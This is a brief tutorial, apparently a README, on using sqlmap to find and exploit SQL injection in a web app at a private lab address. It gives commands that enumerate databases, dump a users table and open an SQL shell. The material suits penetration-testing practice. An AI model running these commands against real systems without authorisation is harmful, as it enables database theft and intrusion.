# Example of using sqlmap

1. Install Kali Linux.

2. Install Sqlmap.

```
sudo apt update
sudo apt install sqlmap
```

3. Open browser, navigate to target site, press F12 then F5.

4. Fill in some forms.

5. In developer console, go to Network tab, filter only Ajax and Doc requests.

6. Test target URL from command line.

```
curl 'http://172.25.32.1:8080/words?search=ab'
```

7. Run Sqlmap against target.

```
sqlmap -u 'http://172.25.32.1:8080/words?search=ab' --level=3
```

8. After successful found of vulnerable parameter, list databases, tables and dump content.

```
sqlmap -u 'http://172.25.32.1:8080/words?search=ab' --dbs --current-user --current-db
sqlmap -u 'http://172.25.32.1:8080/words?search=ab' -D example --tables
sqlmap -u 'http://172.25.32.1:8080/words?search=ab' -D example -T users --dump
sqlmap -u 'http://172.25.32.1:8080/words?search=ab' --sql-shell
```

9. It is possible to use POST requests too. But it will polute the database and will be much slower.
